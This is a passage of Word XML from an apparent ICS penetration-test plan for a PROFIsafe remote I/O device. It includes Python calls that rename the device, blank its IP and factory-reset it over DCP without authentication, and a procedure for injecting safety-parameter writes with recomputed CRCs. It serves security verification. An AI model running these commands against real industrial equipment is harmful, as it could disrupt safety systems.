        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>d.IP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35ABCDEC" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dcp.set_name_of_station</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(d.MAC, "attacker-renamed") # (1) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B07AC88" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dcp.set_ip_address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(d.MAC, ["0.0.0.0","0.0.0.0","0.0.0.0"]) # (2) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SET IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10729010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 xml:space="preserve">try: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dcp.reset_to_factory</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(d.MAC) # (3) Mode 2 reset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160D6133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>except Exception as e: print("reset attempt:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A569B86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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Set/reset accepted without credential (SRIO-3029/3030/7772); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> connection drops → device passivates (safe) but comm-config modified by an unauthorized node. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Unauthenticated reset succeeded (G-2 confirmed) ☐ Rejected/authenticated (refutes G-2) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1102_dcp.pcapng (mirror), Pi console log, before/after /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbussetup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/network/*, passivation trace | </w:t>
      </w:r>
      <w:hyperlink r:id="rId291" w:history="1">
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07992DCA" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Scientific caveat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>honoured</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> this test converts the "protocol-knowledge hypothesis" into an empirical result; SRIO-3029 is cited as </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>corroborating documentation</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not proof. </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> use of repeated DCP resets (availability attack) is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; here only the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (can an unauthorized node do it once?) is tested. </w:t>
      </w:r>
      <w:hyperlink r:id="rId292" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1A7E4426" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="7337204C">
          <v:rect id="_x0000_i1757" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="79092E42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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ011-03 — Fieldbus Parameter Write Without Device-Side Authorization (G-1 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70408C9D" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E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7765"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="43692D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5F5FF0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F07299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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="765B48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454A2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F945C" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TC-RQ011-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="79980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C5CB0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C85DB" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>RQ-011 → CR 1.1 / CR 1.2 / CR 2.1 → Asset B, Asset F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="74B73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36BB2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77A2F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 xml:space="preserve">Tampering + Spoofing + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EoP</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (unauthorized safety-parameter write)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="74502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CA5FC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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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87729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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="3E387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43580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53CC1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Demonstrate that the device enforces </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no credential/authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> of its own on the fieldbus parameter-write path: an unauthorized node presenting a syntactically valid parameter record (correct </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + valid </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>) during the param phase can write safety parameters — confirming authorization is entirely delegated to the environment (CCSC-2), not device-enforced.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="2D39D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3DF8E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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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4003B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1. Observe the legitimate parametrization sequence. 2. From the Pi (impersonating the F-Host or injecting during the param phase), present a modified parameter record with recomputed CRCs. 3. Determine whether the device demands any authentication before accepting the write.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="12BDF9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2D658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5A7AA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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the device requires authentication/authorization before accepting a parameter write. </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the only checks are addressing + CRC integrity (no credential) → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (authorization delegated, not enforced). </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Chains to RQ-005 TC-RQ005-02 (valid-CRC forgery) — but here the finding is the absence of an authorization credential, not the CRC-forgeability itself.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D13CE4F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E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D73D4E" w:rsidRPr="00D73D4E" w14:paraId="0685D4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DE73A9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07CE65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r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="4C4DF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0B932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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E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DAA5F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TC-RQ011-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="37099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2324CC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47941B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Pi eth0 = 192.168.0.100; DUT 192.168.0.2; SPS 192.168.0.1; laptop mirror</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="4010D7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8AE42" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E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1D9E3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t>Scapy</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>F_ParCRC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routine</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>from</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> TC-RQ005-02); Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="46425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22ACD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Procedure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0E086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During the param phase, inject an acyclic parameter-write record with a </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">safety-relevant </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> modified</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>valid recomputed CRCs</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; observe acceptance and whether any credential is solicited/verified.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="7EED5F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FBBF0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Expected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9D216" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">No authentication demanded; acceptance gated only by </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-1983, SRIO-12627); confirms authorization is environmental (SRIO-9402), not device-side. </w:t>
            </w:r>
            <w:hyperlink r:id="rId293" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId294" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="15FD6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42D04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FF4C0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☐ Write accepted without credential (G-1 confirmed)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="2FEEE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E8F97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776872" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">TC1103_paramwrite.pcapng, Pi log, PLC/DUT </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>cross-ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>to</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> TC-RQ005-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A232348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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Boundary note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-011 tests the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>absence of an authorization credential</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
